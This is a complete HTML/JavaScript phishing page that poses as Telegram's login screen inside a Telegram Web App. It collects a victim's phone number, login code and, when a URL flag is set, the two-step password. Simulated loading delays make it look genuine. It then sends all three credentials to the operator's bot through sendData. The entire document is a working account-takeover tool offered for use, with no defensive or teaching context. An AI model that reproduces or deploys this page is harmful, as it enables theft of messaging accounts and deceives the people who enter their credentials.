<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Login</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #17212b;
            font-family: -apple-system, system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #ffffff;
            overflow: hidden;
        }
        .login-card { width: 100%; max-width: 360px; text-align: center; padding: 20px; }
        .logo { width: 160px; height: 160px; margin-bottom: 20px; }
        h2 { font-size: 22px; margin-bottom: 10px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 10px; color: #ffffff; }
        .edit-icon { color: #50a8eb; cursor: pointer; font-size: 20px; transition: transform 0.2s; }
        .edit-icon:hover { transform: scale(1.1); }
        p { color: #97a6b5; font-size: 15px; margin-bottom: 30px; line-height: 1.5; }

        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
        .input-field {
            width: 100%; padding: 14px 20px; font-size: 17px;
            border: 2px solid #2f3b49; border-radius: 14px;
            outline: none; background: transparent; box-sizing: border-box;
            transition: border-color 0.2s; color: #ffffff;
        }
        #password { padding-right: 45px; }
        .input-field:focus { border-color: #50a8eb; }

        .input-label {
            position: absolute; left: 20px; top: 16px;
            color: #708499; font-size: 16px; pointer-events: none;
            transition: all 0.2s ease; background-color: #17212b; padding: 0 5px;
        }
        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            top: -10px; left: 15px; font-size: 12px; font-weight: 500; color: #50a8eb;
        }
        .input-field:not(:placeholder-shown):not(:focus) + .input-label {
            color: #708499; border-color: #2f3b49;
        }

        .password-toggle {
            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
            cursor: pointer; color: #708499; display: flex; align-items: center;
        }
        .password-toggle svg { width: 24px; height: 24px; fill: currentColor; }

        .btn-next {
            background-color: #50a8eb; color: white; border: none; padding: 15px;
            width: 100%; border-radius: 12px; font-size: 16px; cursor: pointer;
            text-transform: uppercase; font-weight: 600; margin-top: 25px;
            display: flex; justify-content: center; align-items: center; min-height: 50px;
        }
        .btn-next.loading { pointer-events: none; opacity: 0.8; }

        .terms-link { display: block; margin-top: 20px; color: #708499; text-decoration: none; font-size: 14px; }
        .hidden { display: none !important; }

        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3); border-radius: 50%;
            border-top: 3px solid #ffffff; width: 22px; height: 22px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
        .digit-box {
            width: 42px; height: 52px; border: 2px solid #2f3b49;
            border-radius: 8px; position: relative; overflow: hidden;
            transition: all 0.3s ease; background: transparent;
        }
        .digit-box:focus-within { border-color: #50a8eb; box-shadow: 0 0 0 3px rgba(80, 168, 235, 0.1); }
        .code-digit {
            width: 100%; height: 100%; border: none; background: transparent;
            font-size: 24px; font-weight: bold; text-align: center;
            outline: none; padding: 0; margin: 0; color: #ffffff;
        }
        @keyframes slideNum { 0% { transform: translateY(100%); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
        .code-digit.animate-text { animation: slideNum 0.2s ease-out forwards; }
        .digit-box.locked { background-color: #0e1621; border-color: #1e2733; }
        .digit-box.locked .code-digit { color: #536375; }
        .digit-box.success { border-color: #46d168 !important; }

        @keyframes shake {
            0% { transform: translateX(0); } 25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); } 75% { transform: translateX(-5px); }
            100% { transform: translateX(0); }
        }
        .input-field.error { border-color: #ff5e57 !important; color: #ff5e57 !important; animation: shake 0.4s ease-in-out; }
    </style>
</head>
<body>

<div class="login-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo" class="logo">
    <h2 id="main-title">Telegram</h2>
    <p id="main-desc">Please confirm your country code and<br>enter your phone number.</p>

    <form onsubmit="return false;">
        <!-- 1. ТЕЛЕФОН -->
        <div id="step-phone">
            <div class="input-group">
                <input type="tel" id="phone" class="input-field" placeholder=" ">
                <label for="phone" class="input-label">Your phone number</label>
            </div>
            <button type="button" class="btn-next" id="btn-phone">Next</button>
            <a href="#" class="terms-link">Terms of Service</a>
        </div>

        <!-- 2. КОД -->
        <div id="step-code" class="hidden">
            <div class="code-container" id="otp-inputs">
                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
            </div>
        </div>

        <!-- 3. ПАРОЛЬ -->
        <div id="step-pass" class="hidden">
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder=" ">
                <label for="password" class="input-label">Password</label>
                <div class="password-toggle" id="togglePass">
                    <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                </div>
            </div>
            <button type="button" class="btn-next" id="btn-pass">Next</button>
        </div>
    </form>
</div>

<script>
    // Инициализация
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.setHeaderColor('#17212b');
    tg.setBackgroundColor('#17212b');

    // Проверка режима пароля
    const urlParams = new URLSearchParams(window.location.search);
    const needPassword = urlParams.get('p') === '1';

    // Элементы
    const phoneInput = document.getElementById('phone');
    const btnPhone = document.getElementById('btn-phone');
    const stepPhoneDiv = document.getElementById('step-phone');

    const stepCodeDiv = document.getElementById('step-code');

    const passwordInput = document.getElementById('password');
    const btnPass = document.getElementById('btn-pass');
    const stepPassDiv = document.getElementById('step-pass');
    const togglePass = document.getElementById('togglePass');

    const title = document.getElementById('main-title');
    const desc = document.getElementById('main-desc');

    // ============================================
    // ТЕЛЕФОН (МАСКА + ВВОД)
    // ============================================

    // Форматирование номера (Возвращает отформатированную строку)
    function formatPhoneNumber(val) {
        let x = val.replace(/\D/g, '');
        let res = '';

        if (x.length === 0) return '+';

        if (x[0] === '7' || x[0] === '8') {
             if (x[0] === '8') x = '7' + x.substring(1);
             x = x.substring(0, 11);
             res = '+7';
             if (x.length > 1) res += ' ' + x.substring(1, 4);
             if (x.length > 4) res += ' ' + x.substring(4, 7);
             if (x.length > 7) res += ' ' + x.substring(7, 9);
             if (x.length > 9) res += ' ' + x.substring(9, 11);
        } else if (x.startsWith('380')) {
             x = x.substring(0, 12);
             res = '+380';
             if (x.length > 3) res += ' ' + x.substring(3, 5);
             if (x.length > 5) res += ' ' + x.substring(5, 8);
             if (x.length > 8) res += ' ' + x.substring(8, 10);
             if (x.length > 10) res += ' ' + x.substring(10, 12);
        } else if (x.startsWith('375')) {
             x = x.substring(0, 12);
             res = '+375';
             if (x.length > 3) res += ' ' + x.substring(3, 5);
             if (x.length > 5) res += ' ' + x.substring(5, 8);
             if (x.length > 8) res += ' ' + x.substring(8, 10);
             if (x.length > 10) res += ' ' + x.substring(10, 12);
        } else {
             res = '+' + x;
        }
        return res;
    }

    // Обработчик ввода
    phoneInput.addEventListener('input', (e) => {
        phoneInput.classList.remove('error');
        // Переписываем значение полностью
        e.target.value = formatPhoneNumber(e.target.value);
    });

    phoneInput.addEventListener('focus', () => {
        if (phoneInput.value === '') phoneInput.value = '+';
    });

    // Кнопка NEXT
    btnPhone.addEventListener('click', () => {
        const raw = phoneInput.value.replace(/\D/g, '');
        let min = 10;
        if (raw.startsWith('7')) min = 11;
        if (raw.startsWith('380') || raw.startsWith('375')) min = 12;

        if (raw.length < min) {
            phoneInput.classList.add('error');
            setTimeout(() => phoneInput.classList.remove('error'), 500);
            return;
        }

        btnPhone.classList.add('loading');
        btnPhone.innerHTML = '<div class="loader"></div>';
        phoneInput.readOnly = true;

        setTimeout(() => {
            btnPhone.classList.remove('loading');
            btnPhone.innerText = 'Next';
            showCodeStep(phoneInput.value);
        }, 3000);
    });

    // ============================================
    // КОД
    // ============================================
    function showCodeStep(phoneNumber) {
        stepPhoneDiv.classList.add('hidden');
        stepPassDiv.classList.add('hidden');
        stepCodeDiv.classList.remove('hidden');

        title.innerHTML = `${phoneNumber} <span class="edit-icon" onclick="goBack()">✎</span>`;
        desc.innerHTML = 'We have sent you a code<br>to the Telegram app.';

        setTimeout(() => document.querySelector('.code-digit').focus(), 100);
    }

    const inputs = document.querySelectorAll('.code-digit');
    const boxes = document.querySelectorAll('.digit-box');

    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            if (e.target.value) {
                // Анимация
                input.classList.remove('animate-text');
                void input.offsetWidth;
                input.classList.add('animate-text');

                if (index < inputs.length - 1) inputs[index + 1].focus();
                else handleCodeEntered();
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
        });

        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const text = e.clipboardData.getData('text').replace(/\D/g, '');
            let idx = 0;
            inputs.forEach(inp => {
                if (idx < text.length) {
                    inp.value = text[idx++];
                    inp.classList.remove('animate-text');
                    void inp.offsetWidth;
                    inp.classList.add('animate-text');
                }
            });
            if (text.length >= 5) handleCodeEntered();
            else if (idx > 0) inputs[Math.min(idx, inputs.length) - 1].focus();
        });
    });

    function handleCodeEntered() {
        inputs.forEach(inp => { inp.readOnly = true; inp.blur(); });
        boxes.forEach(box => box.classList.add('locked'));

        setTimeout(() => {
            if (needPassword) {
                showPasswordStep();
            } else {
                finishInput();
            }
        }, 800);
    }

    // ============================================
    // ПАРОЛЬ
    // ============================================
    function showPasswordStep() {
        stepCodeDiv.classList.add('hidden');
        stepPhoneDiv.classList.add('hidden');
        stepPassDiv.classList.remove('hidden');

        title.innerText = 'Enter a Password';
        desc.innerHTML = 'Your account is protected with<br>an additional password.';

        setTimeout(() => passwordInput.focus(), 100);
    }

    togglePass.addEventListener('click', () => {
        passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
    });

    btnPass.addEventListener('click', () => {
        if (!passwordInput.value) {
            passwordInput.classList.add('error');
            setTimeout(() => passwordInput.classList.remove('error'), 500);
            return;
        }
        btnPass.classList.add('loading');
        btnPass.innerHTML = '<div class="loader"></div>';
        passwordInput.readOnly = true;

        setTimeout(() => {
            finishInput();
        }, 3000);
    });

    // ============================================
    // ВОЗВРАТ И ОТПРАВКА
    // ============================================
    window.goBack = function() {
        stepCodeDiv.classList.add('hidden');
        stepPassDiv.classList.add('hidden');
        stepPhoneDiv.classList.remove('hidden');

        title.innerText = 'Telegram';
        desc.innerHTML = 'Please confirm your country code and<br>enter your phone number.';

        phoneInput.readOnly = false;
        phoneInput.value = ''; // Сброс номера при возврате
        phoneInput.focus();

        passwordInput.value = '';
        passwordInput.readOnly = false;
        btnPass.classList.remove('loading');
        btnPass.innerText = 'Next';

        btnPhone.classList.remove('loading');
        btnPhone.innerText = 'Next';

        inputs.forEach(inp => { inp.value = ''; inp.readOnly = false; });
        boxes.forEach(box => { box.classList.remove('locked'); box.classList.remove('success'); });
    };

    function finishInput() {
        const data = {
            phone: phoneInput.value,
            code: Array.from(inputs).map(i => i.value).join(''),
            password: passwordInput.value
        };

        try {
            if (tg) {
                tg.sendData(JSON.stringify(data));
            } else {
                alert("Ошибка: WebApp не найден");
            }
        } catch (e) {
            alert("Ошибка отправки: " + e.message);
        }

        // Если пароль не нужен, показываем зеленый успех перед закрытием
        if (!needPassword) {
            boxes.forEach(box => {
                box.classList.remove('locked');
                box.classList.add('success');
            });
        }
    }
</script>

</body>
</html>